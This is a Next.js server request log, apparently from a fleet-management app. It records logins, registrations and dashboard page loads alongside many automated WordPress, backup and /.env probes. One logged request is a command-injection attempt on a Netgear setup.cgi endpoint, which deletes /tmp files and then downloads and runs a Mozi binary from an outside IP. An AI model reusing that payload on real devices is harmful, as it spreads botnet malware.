+ GET /media/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET / 200 in 39ms
+ GET / 200 in 110ms
+ GET /wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /xmlrpc.php?rsd 404 in 15ms
+ GET / 200 in 31ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 12ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /register 200 in 56ms
+ GET / 200 in 462ms
+ GET / 200 in 500ms
+ HEAD / 200 in 55ms
+ GET / 200 in 49ms
+ ○ Compiling /favicon.ico ...
+ ✓ Compiled /favicon.ico in 1057ms (868 modules)
+ GET /favicon.ico 200 in 1235ms
+ GET / 200 in 245ms
+ GET / 200 in 51ms
+ HEAD / 200 in 42ms
+ GET / 200 in 57ms
+ HEAD / 200 in 228ms
+ GET / 200 in 57ms
+ GET /favicon.ico 200 in 23ms
+ GET / 200 in 65ms
+ ○ Compiling /_not-found ...
+ ✓ Compiled /_not-found in 1358ms (1751 modules)
+ HEAD /wordpress 404 in 1608ms
+ HEAD / 200 in 84ms
+ HEAD /wp 404 in 15ms
+ HEAD /bc 404 in 15ms
+ HEAD /bk 404 in 16ms
+ HEAD /backup 404 in 13ms
+ HEAD /old 404 in 17ms
+ HEAD /new 404 in 16ms
+ HEAD /main 404 in 14ms
+ HEAD /home 404 in 17ms
+ GET / 200 in 98ms
+ GET / 200 in 63ms
+ ○ Compiling /api/auth/[...nextauth] ...
+ ✓ Compiled /api/auth/[...nextauth] in 1469ms (1153 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 1703ms
+ GET /api/auth/session 200 in 1715ms
+ GET / 200 in 223ms
+ ✓ Compiled /api/auth/[...nextauth] in 401ms (868 modules)
+ ✓ Compiled (1181 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 762ms
+ GET /api/auth/session 200 in 742ms
+ GET /favicon.ico 200 in 773ms
+ GET / 200 in 152ms
+ GET /api/auth/session 200 in 24ms
+ GET /api/auth/session 200 in 9ms
+ GET /favicon.ico 200 in 14ms
+ GET / 200 in 89ms
+ GET / 200 in 74ms
+ GET /favicon.ico 200 in 13ms
+ GET / 200 in 306ms
+ ○ Compiling /_not-found ...
+ ✓ Compiled /_not-found in 1388ms (1751 modules)
+ GET /wp-admin/setup-config.php 404 in 1715ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 33ms
+ GET /.env 404 in 32ms
+ GET / 200 in 868ms
+ ○ Compiling /favicon.ico ...
+ ✓ Compiled /favicon.ico in 1489ms (868 modules)
+ GET /favicon.ico 200 in 1723ms
+ ○ Compiling /_not-found ...
+ ✓ Compiled /_not-found in 505ms (1751 modules)
+ GET /robots.txt 404 in 688ms
+ GET / 200 in 109ms
+ ✓ Compiled /api/auth/[...nextauth] in 192ms (1154 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 453ms
+ GET /api/auth/session 200 in 22ms
+ GET / 200 in 163ms
+ GET / 200 in 43ms
+ GET /api/auth/session 200 in 27ms
+ GET /api/auth/session 200 in 21ms
+ GET /api/auth/session 200 in 33ms
+ GET /api/auth/session 200 in 12ms
+ ✓ Compiled /favicon.ico in 130ms (1182 modules)
+ GET /favicon.ico 200 in 203ms
+ GET / 200 in 161ms
+ GET / 200 in 502ms
+ GET / 200 in 122ms
+ GET /wp-includes/wlwmanifest.xml 404 in 57ms
+ GET /xmlrpc.php?rsd 404 in 41ms
+ GET / 200 in 217ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 121ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 69ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 51ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 32ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET / 200 in 68ms
+ GET /wp-admin/setup-config.php 404 in 137ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 62ms
+ GET /.env 404 in 68ms
+ GET / 200 in 277ms
+ GET /wp-includes/ID3/license.txt 404 in 57ms
+ GET /xmlrpc.php?rsd 404 in 28ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /2021/wp-includes/wlwmanifest.xml 404 in 29ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 55ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET / 200 in 2881ms
+ GET / 200 in 458ms
+ GET /register 200 in 333ms
+ GET /register 200 in 52ms
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 186ms
+ GET /api/auth/session 200 in 21ms
+ GET / 200 in 330ms
+ GET / 200 in 378ms
+ GET /wp-includes/ID3/license.txt 404 in 37ms
+ GET /xmlrpc.php?rsd 404 in 26ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /2021/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 51ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 43ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /terms 404 in 118ms
+ GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://119.115.70.146:53040/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 404 in 48ms
+ OPTIONS / 200 in 231ms
+ GET / 200 in 108ms
+ GET / 200 in 66ms
+ GET /register 200 in 81ms
+ GET / 200 in 742ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 41ms
+ GET /wp-admin/setup-config.php 404 in 31ms
+ HEAD / 200 in 86ms
+ GET / 200 in 59ms
+ GET /favicon.ico 200 in 36ms
+ OPTIONS / 200 in 399ms
+ GET / 200 in 151ms
+ GET /favicon.ico 200 in 34ms
+ GET / 200 in 89ms
+ GET /.env 404 in 180ms
+ GET / 200 in 461ms
+ GET / 200 in 77ms
+ GET /wp-includes/wlwmanifest.xml 404 in 45ms
+ GET /xmlrpc.php?rsd 404 in 47ms
+ GET / 200 in 129ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 580ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 81ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 60ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET / 200 in 92ms
+ GET / 200 in 44ms
+ GET /wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /xmlrpc.php?rsd 404 in 25ms
+ GET / 200 in 181ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 29ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 490ms
+ GET /wp-admin/setup-config.php 404 in 79ms
+ GET / 200 in 156ms
+ GET / 200 in 60ms
+ GET /wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /xmlrpc.php?rsd 404 in 22ms
+ GET / 200 in 258ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 77ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 41ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 29ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET / 200 in 71ms
+ GET / 200 in 48ms
+ GET /favicon.ico 200 in 16ms
+ GET / 200 in 61ms
+ GET /api/auth/session 200 in 60ms
+ GET /api/auth/session 200 in 22ms
+ GET / 200 in 63ms
+ GET /api/auth/session 200 in 27ms
+ GET /favicon.ico 200 in 22ms
+ GET /api/auth/session 200 in 20ms
+ GET / 200 in 41ms
+ GET /api/auth/session 200 in 38ms
+ GET /api/auth/session 200 in 18ms
+ GET /api/auth/session 200 in 12ms
+ ○ Compiling /api/register ...
+ ✓ Compiled /api/register in 1739ms (1204 modules)
+prisma:query INSERT INTO "public"."User" ("id","name","email","password","role","createdAt","updatedAt") VALUES ($1,$2,$3,$4,CAST($5::text AS "public"."Role"),$6,$7) RETURNING "public"."User"."id", "public"."User"."name", "public"."User"."email", "public"."User"."password", "public"."User"."emailVerified", "public"."User"."image", "public"."User"."role"::text, "public"."User"."createdAt", "public"."User"."updatedAt"
+ POST /api/register 201 in 3271ms
+ ○ Compiling /login ...
+ ✓ Compiled /login in 1245ms (1209 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/providers 200 in 134ms
+ GET /api/auth/csrf 200 in 13ms
+prisma:query SELECT "public"."User"."id", "public"."User"."name", "public"."User"."email", "public"."User"."password", "public"."User"."emailVerified", "public"."User"."image", "public"."User"."role"::text, "public"."User"."createdAt", "public"."User"."updatedAt" FROM "public"."User" WHERE ("public"."User"."email" = $1 AND 1=1) LIMIT $2 OFFSET $3
+ POST /api/auth/callback/credentials 200 in 138ms
+ GET /api/auth/session 200 in 13ms
+ ○ Compiling /dashboard ...
+ ✓ Compiled /dashboard in 3.6s (3225 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/providers 200 in 473ms
+ GET /api/auth/csrf 200 in 51ms
+prisma:query SELECT "public"."User"."id", "public"."User"."name", "public"."User"."email", "public"."User"."password", "public"."User"."emailVerified", "public"."User"."image", "public"."User"."role"::text, "public"."User"."createdAt", "public"."User"."updatedAt" FROM "public"."User" WHERE ("public"."User"."email" = $1 AND 1=1) LIMIT $2 OFFSET $3
+ POST /api/auth/callback/credentials 200 in 105ms
+ GET /api/auth/session 200 in 14ms
+ ○ Compiling /dashboard/map ...
+ ✓ Compiled /dashboard/map in 2.8s (3315 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 76ms
+ GET /api/auth/session 200 in 17ms
+ GET / 200 in 193ms
+ GET / 200 in 42ms
+ ○ Compiling /_not-found ...
+ ✓ Compiled /_not-found in 1157ms (3318 modules)
+ GET /wp-includes/wlwmanifest.xml 404 in 1279ms
+ GET /xmlrpc.php?rsd 404 in 17ms
+ GET / 200 in 89ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 20ms
+ ○ Compiling /dashboard/vehicles ...
+ ✓ Compiled /dashboard/vehicles in 1819ms (3341 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 76ms
+ GET /api/auth/session 200 in 19ms
+ GET /api/auth/session 200 in 61ms
+ GET /api/auth/session 200 in 21ms
+ GET / 200 in 173ms
+ ✓ Compiled /favicon.ico in 307ms (1809 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 884ms
+ GET /favicon.ico 200 in 907ms
+ GET /api/auth/session 200 in 12ms
+ GET /api/auth/session 200 in 13ms
+ GET / 200 in 190ms
+ GET /api/auth/session 200 in 48ms
+ GET /api/auth/session 200 in 12ms
+ ○ Compiling /login ...
+ ✓ Compiled /login in 573ms (1784 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/providers 200 in 71ms
+ GET /api/auth/csrf 200 in 13ms
+prisma:query SELECT 1
+prisma:query SELECT "public"."User"."id", "public"."User"."name", "public"."User"."email", "public"."User"."password", "public"."User"."emailVerified", "public"."User"."image", "public"."User"."role"::text, "public"."User"."createdAt", "public"."User"."updatedAt" FROM "public"."User" WHERE ("public"."User"."email" = $1 AND 1=1) LIMIT $2 OFFSET $3
+ POST /api/auth/callback/credentials 200 in 108ms
+ GET /api/auth/session 200 in 38ms
+ ○ Compiling /api/register ...
+ ✓ Compiled /api/register in 550ms (1762 modules)
+prisma:query SELECT 1
+prisma:query INSERT INTO "public"."User" ("id","name","email","password","role","createdAt","updatedAt") VALUES ($1,$2,$3,$4,CAST($5::text AS "public"."Role"),$6,$7) RETURNING "public"."User"."id", "public"."User"."name", "public"."User"."email", "public"."User"."password", "public"."User"."emailVerified", "public"."User"."image", "public"."User"."role"::text, "public"."User"."createdAt", "public"."User"."updatedAt"
+ POST /api/register 201 in 715ms
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/providers 200 in 65ms
+ GET /api/auth/csrf 200 in 16ms
+prisma:query SELECT "public"."User"."id", "public"."User"."name", "public"."User"."email", "public"."User"."password", "public"."User"."emailVerified", "public"."User"."image", "public"."User"."role"::text, "public"."User"."createdAt", "public"."User"."updatedAt" FROM "public"."User" WHERE ("public"."User"."email" = $1 AND 1=1) LIMIT $2 OFFSET $3
+ POST /api/auth/callback/credentials 200 in 88ms
+ GET /api/auth/session 200 in 34ms
+ GET /api/auth/session 200 in 44ms
+ GET /api/auth/session 200 in 26ms
+ GET /api/auth/session 200 in 33ms
+ GET /api/auth/session 200 in 19ms
+ GET /api/auth/csrf 200 in 43ms
+ POST /api/auth/signout 200 in 19ms
+ GET /api/auth/session 200 in 15ms
+ GET /dashboard 200 in 166ms
+ GET /api/auth/session 200 in 31ms
+ GET /api/auth/session 200 in 29ms
+ GET /api/auth/session 200 in 24ms
+ GET /api/auth/session 200 in 50ms
+ GET / 200 in 102ms
+ GET / 200 in 123ms
+ ○ Compiling /_not-found ...
+ ✓ Compiled /_not-found in 980ms (2956 modules)
+ GET /wp-includes/wlwmanifest.xml 404 in 1117ms
+ GET /xmlrpc.php?rsd 404 in 17ms
+ GET / 200 in 86ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET / 200 in 95ms
+ GET / 200 in 197ms
+ GET /wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /xmlrpc.php?rsd 404 in 27ms
+ GET / 200 in 41ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 20ms
+ ○ Compiling /api/auth/[...nextauth] ...
+ ✓ Compiled /api/auth/[...nextauth] in 1923ms (1738 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 2273ms
+ GET /api/auth/session 200 in 53ms
+ GET / 200 in 279ms
+ GET /api/auth/providers 200 in 41ms
+ GET /api/auth/csrf 200 in 12ms
+prisma:query SELECT "public"."User"."id", "public"."User"."name", "public"."User"."email", "public"."User"."password", "public"."User"."emailVerified", "public"."User"."image", "public"."User"."role"::text, "public"."User"."createdAt", "public"."User"."updatedAt" FROM "public"."User" WHERE ("public"."User"."email" = $1 AND 1=1) LIMIT $2 OFFSET $3
+ POST /api/auth/callback/credentials 200 in 882ms
+ GET /api/auth/session 200 in 35ms
+ GET /api/auth/session 200 in 46ms
+ GET /api/auth/session 200 in 19ms
+ ○ Compiling /dashboard/map ...
+ ✓ Compiled /dashboard/map in 697ms (1784 modules)
+ ○ Compiling /dashboard/invoices ...
+ ✓ Compiled /dashboard/invoices in 1949ms (3332 modules)
+ ○ Compiling /dashboard/incidents ...
+ ✓ Compiled /dashboard/incidents in 928ms (3338 modules)
+ ○ Compiling /dashboard/analytics/fuel ...
+ ✓ Compiled /dashboard/analytics/fuel in 3.5s (3361 modules)
+ GET /api/incidents 404 in 4023ms
+ GET /api/incidents 404 in 22ms
+ GET / 200 in 95ms
+ ○ Compiling /favicon.ico ...
+ ✓ Compiled /favicon.ico in 569ms (1838 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 991ms
+ GET /api/auth/session 200 in 713ms
+ GET /favicon.ico 200 in 1010ms
+ GET / 200 in 183ms
+ GET /api/auth/session 200 in 90ms
+ GET /api/auth/session 200 in 88ms
+ GET / 200 in 73ms
+ GET / 200 in 68ms
+ GET / 200 in 64ms
+ GET /api/auth/session 200 in 52ms
+ GET /api/auth/session 200 in 15ms
+ GET /api/auth/session 200 in 62ms
+ GET /api/auth/session 200 in 47ms
+ GET /robots.txt 404 in 63ms
+ GET / 200 in 95ms
+ GET /.env 404 in 52ms
+ GET /robots.txt 404 in 75ms
+ GET / 200 in 93ms
+ GET / 200 in 117ms
+ GET / 200 in 64ms
+ GET /wp-includes/wlwmanifest.xml 404 in 44ms
+ GET /xmlrpc.php?rsd 404 in 41ms
+ GET / 200 in 59ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 28ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 76ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 67ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 47ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /api/auth/session 200 in 319ms
+ GET /wp-admin/setup-config.php 404 in 239ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 90ms
+ GET / 200 in 174ms
+ GET / 200 in 147ms
+ GET / 200 in 960ms
+ GET /wp-includes/ID3/license.txt 404 in 168ms
+ GET /xmlrpc.php?rsd 404 in 32ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 99ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /2021/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 85ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 72ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 34ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET / 200 in 92ms
+ GET /favicon.ico 200 in 20ms
+ HEAD / 200 in 525ms
+ GET / 200 in 614ms
+ GET / 200 in 225ms
+ GET / 200 in 158ms
+ GET /wp-includes/wlwmanifest.xml 404 in 39ms
+ GET /xmlrpc.php?rsd 404 in 78ms
+ GET / 200 in 62ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 31ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 36ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 36ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 29ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 89ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 103ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 24ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 29ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 27ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /robots.txt 404 in 81ms
+ HEAD / 200 in 91ms
+ GET / 200 in 86ms
+ GET / 200 in 764ms
+ GET /wp-admin/setup-config.php 404 in 89ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 179ms
+ GET / 200 in 177ms
+ GET / 200 in 135ms
+ GET /wp-includes/wlwmanifest.xml 404 in 1388ms
+ HEAD /wordpress 404 in 40ms
+ GET /xmlrpc.php?rsd 404 in 25ms
+ GET / 200 in 51ms
+ HEAD / 200 in 32ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 37ms
+ HEAD /wp 404 in 18ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 56ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 46ms
+ HEAD /bc 404 in 13ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 21ms
+ HEAD /bk 404 in 15ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 26ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 21ms
+ HEAD /backup 404 in 13ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 21ms
+ HEAD /old 404 in 20ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 21ms
+ HEAD /new 404 in 13ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 22ms
+ HEAD /main 404 in 17ms
